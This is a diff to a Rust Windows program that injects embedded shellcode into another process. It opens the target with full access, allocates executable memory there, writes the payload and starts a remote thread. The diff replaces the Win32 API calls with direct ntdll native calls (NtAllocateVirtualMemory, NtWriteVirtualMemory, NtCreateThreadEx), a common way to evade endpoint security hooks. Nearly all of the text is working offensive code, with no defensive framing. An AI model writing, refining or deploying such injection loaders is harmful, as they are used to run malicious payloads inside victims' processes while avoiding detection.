@@ -1,12 +1,12 @@
 use std::{env, ffi::c_void, ptr};
 use windows::Win32::{
-    Foundation::{BOOL, CloseHandle, HANDLE, NTSTATUS},
-    System::{
-        Diagnostics::Debug::WriteProcessMemory,
-        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
-        Threading::{OpenProcess, PROCESS_ALL_ACCESS, WaitForSingleObject},
-    },
+    Foundation::{BOOL, HANDLE, NTSTATUS},
+    System::Threading::{OpenProcess, PROCESS_ALL_ACCESS},
 };
+
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_RESERVE: u32 = 0x2000;
+const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
 #[link(name = "ntdll")]
 unsafe extern "system" {
@@ -23,6 +23,27 @@ unsafe extern "system" {
         maximum_stack_size: usize,
         attribute_list: *mut c_void,
     ) -> NTSTATUS;
+
+    pub fn NtAllocateVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut *mut c_void,
+        ZeroBits: usize,
+        RegionSize: *mut usize,
+        AllocationType: u32,
+        Protect: u32,
+    ) -> NTSTATUS;
+
+    pub fn NtWriteVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut c_void,
+        Buffer: *mut c_void,
+        BufferSize: usize,
+        ReturnSize: *mut usize,
+    ) -> NTSTATUS;
+
+    pub fn NtWaitForSingleObject(Handle: HANDLE, Altertable: u8, Timeout: *mut i64) -> NTSTATUS;
+
+    pub fn NtClose(Handle: HANDLE) -> NTSTATUS;
 }
 
 pub fn main() -> windows::core::Result<()> {
@@ -71,24 +92,36 @@ pub fn main() -> windows::core::Result<()> {
             0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9,
             0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
         ];
+        let mut remote_addr: *mut c_void = std::ptr::null_mut();
+        let mut region_size: usize = shellcode.len() as usize;
 
-        let remote_addr = VirtualAllocEx(
+        let allocation_status = NtAllocateVirtualMemory(
             h_process,
-            None,
-            shellcode.len(),
+            &mut remote_addr as *mut *mut c_void,
+            0usize as usize,
+            &mut region_size as *mut usize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
         );
-        assert!(!remote_addr.is_null(), "VirtualAllocEx failed");
 
-        WriteProcessMemory(
+        assert!(
+            allocation_status.0 == 0,
+            "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
+            allocation_status.0
+        );
+        let write_size: *mut usize = std::ptr::null_mut();
+        let write_status = NtWriteVirtualMemory(
             h_process,
             remote_addr,
-            shellcode.as_ptr() as _,
+            shellcode.as_ptr() as *mut c_void,
             shellcode.len(),
-            None,
-        )
-        .expect("WriteProcessMemory failed");
+            write_size,
+        );
+        assert!(
+            write_status.0 == 0,
+            "NtWrtieVirtualMemomry failed with NTSTATUS: 0x{:X}",
+            write_status.0
+        );
 
         let mut h_thread: HANDLE = HANDLE(0);
         let status = NtCreateThreadEx(
@@ -111,8 +144,15 @@ pub fn main() -> windows::core::Result<()> {
             status.0
         );
 
-        WaitForSingleObject(h_thread, 5000);
-        let _ = CloseHandle(h_thread);
-        return CloseHandle(h_process);
+        let wfso_status = NtWaitForSingleObject(h_thread, 0, ptr::null_mut());
+        assert!(
+            wfso_status.0 == 0,
+            "NtWaitForSingleObject failed with NTSTATUS: 0x{:X}",
+            wfso_status.0
+        );
+        let _ = NtClose(h_thread);
+        let _ = NtClose(h_process);
+        return Ok(());
     }
 }
+
